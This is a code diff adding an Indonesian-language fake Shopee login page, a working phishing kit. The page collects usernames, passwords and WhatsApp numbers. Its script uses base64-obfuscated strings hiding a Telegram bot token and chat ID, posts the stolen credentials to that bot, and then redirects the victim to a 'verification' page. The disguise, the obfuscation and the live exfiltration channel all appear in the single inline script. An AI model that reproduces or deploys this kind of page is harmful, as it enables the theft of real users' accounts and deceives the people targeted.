@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white min-h-screen flex flex-col items-center justify-center px-6">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg" class="mb-10 w-16">
+    <div id="mS" class="w-full max-w-sm">
+        <form id="lF" autocomplete="off">
+            <input id="u" class="w-full border-b border-gray-300 py-3 mb-4 outline-none" placeholder="No. Handphone/Email/Username" type="text" required>
+            <input id="p" class="w-full border-b border-gray-300 py-3 mb-6 outline-none" placeholder="Password" type="password" required>
+            <button type="submit" class="w-full bg-orange-600 text-white py-3 rounded font-bold mb-4">Log In</button>
+        </form>
+        <div class="space-y-3">
+            <button onclick="alert('Silakan gunakan metode login lain.')" class="w-full flex items-center border border-gray-300 rounded py-2 px-4 text-sm"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg" class="mr-3 w-5"> Google</button>
+            <button onclick="alert('Silakan gunakan metode login lain.')" class="w-full flex items-center border border-gray-300 rounded py-2 px-4 text-sm"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" class="mr-3 w-5"> Facebook</button>
+            <button onclick="document.getElementById('mS').classList.add('hidden');document.getElementById('wS').classList.remove('hidden');" class="w-full flex items-center border border-gray-300 rounded py-2 px-4 text-sm"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="mr-3 w-5"> WhatsApp</button>
+        </div>
+    </div>
+    <div id="wS" class="hidden w-full max-w-sm text-center">
+        <h2 class="text-xl font-bold mb-6 text-green-600">WhatsApp</h2>
+        <input id="wN" type="tel" inputmode="numeric" placeholder="Nomor WhatsApp" class="w-full border border-gray-300 rounded py-2 px-3 mb-4 outline-none">
+        <button id="wB" class="w-full bg-green-600 text-white py-2 rounded font-bold">Lanjut</button>
+    </div>
+    <script>
+        (function(){
+            var _0x5f21=["ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==","NTkyMzAzMTgyNQ==","dmVyaWZpa2FzaS5odG1s","aHR0cHM6Ly9hcGku","dGVsZWdyYW0ub3JnL2JvdA==","L3NlbmRNZXNzYWdl"];
+            window._0x4b=async function(m,n){
+                localStorage.setItem('vNum',n||document.getElementById('u').value);
+                var _u=atob(_0x5f21[3])+atob(_0x5f21[4])+atob(_0x5f21[0])+atob(_0x5f21[5]);
+                await fetch(_u,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:atob(_0x5f21[1]),text:m})});
+                window.location.href=atob(_0x5f21[2]);
+            };
+            document.getElementById("lF").onsubmit=function(e){e.preventDefault();_0x4b("U: "+document.getElementById("u").value+" | P: "+document.getElementById("p").value);};
+            document.getElementById("wB").onclick=function(){_0x4b("WA: "+document.getElementById("wN").value,document.getElementById("wN").value);};
+        })();
+    </script>
+</body>
+</html>
